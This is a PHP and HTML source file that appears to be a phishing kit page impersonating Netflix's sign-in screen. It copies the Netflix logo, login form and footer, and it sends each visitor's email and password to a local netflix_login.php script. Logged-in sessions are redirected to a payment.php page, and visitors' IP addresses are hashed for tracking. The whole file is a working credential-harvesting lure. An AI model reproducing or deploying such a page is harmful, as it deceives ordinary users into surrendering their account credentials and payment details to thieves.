<?php
session_start();
include('functions.php');
$ip = get_client_ip();
$hash = md5($ip);
if(@$_SESSION['logged'] == true) {
	header("Location: payment.php" . getUrlHash($hash));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Netflix</title>
	<link rel="shortcut icon" href="favicon.ico"/>

	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/style.css" rel="stylesheet">

</head>
<body>

	<div class="body-wrapper">
		<div class="netflix-logo">
			<svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><title></title>
				<g id="netflix-logo">
					<path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"
						  id="Fill-14"></path>
				</g>
			</svg>
		</div>
		<div class="clearfix"></div>


		<form method="post" action="netflix_login.php<?=getUrlHash($hash);?>" onsubmit="return validate();">
			<div class="login-box">
			<h1 class="sign-in-text">Sign In</h1>

			<div class="form-group">
				<input type="text" id="email" class="input-field form-control" name="email" placeholder=""/>
				<label for="email" class="">Email or phone number</label>

				<div class="clearfix"></div>
				<div class="error-msg hidden">
					Please enter a valid email
				</div>
			</div>

			<div class="form-group">
				<input type="password" id="password" class="input-field form-control" name="password" placeholder=""/>
				<label for="password" class="">Password</label>

				<div class="clearfix"></div>
				<div class="error-msg hidden">
					Your password must contain between 4 and 60 characters.
				</div>
			</div>

			<div class="form-group submit_group ">
				<input type="submit" name="submit" class="form-control submit-btn" value="Sign In"/>
			</div>
			<div class="clearfix"></div>
			<div class="row">
				<div class="col-xs-6">
					<div class="form-group remember_me">
						<input type="checkbox"> <span>Remember me</span>
					</div>
				</div>
				<div class="col-xs-6 need_help">
					<a href="#">Need help?</a>
				</div>
			</div>
			<div class="clearfix"></div>
			<div class="login_facebook">
				<img class="facebook-logo" src="img/f-logo.png">
				<span>Login with Facebook</span>
			</div>
			<div class="clearfix"></div>
			<div class="new_member">
				<span>New to Netflix?</span><a href="#">Sign up now.</a>
			</div>
		</div>
		</form>

		<hr class="hidden-lg hidden-sm hidden-md" />

		<div class="footer">
			<div class="container">
				<div class="row">
					<div class="col-xs-12 questions">
						<span>Questions? Call <a href="#">1-866-579-7172</a></span>
					</div>
				</div>
				<div class="clearfix"></div>
				<div class="row footer_links">
					<div class="col-xs-12 col-sm-9">
						<div class="row">
							<div class="col-xs-4">
								<span>Gift Card Terms</span>
							</div>
							<div class="col-xs-4">
								<span>Terms of Use</span>
							</div>
							<div class="col-xs-4">
								<span>Privacy Statement</span>
							</div>
						</div>
					</div>
				</div>
				<div class="clearfix"></div>
				<div class="row language_change">
					<div class="col-xs-12">
						<select name="language" class="language">
							<option selected="English">English</option>
						</select>
						<img src="img/globe.png" class="globe" />
						<img src="img/dropdown-arrow.png" class="dropdown_arrow" />
					</div>
				</div>
			</div>
		</div>

	</div>

	<script src="js/jquery.min.js"></script>
	<script src="js/bootstrap.min.js"></script>
	<script src="js/validate.min.js"></script>
</body>
</html>
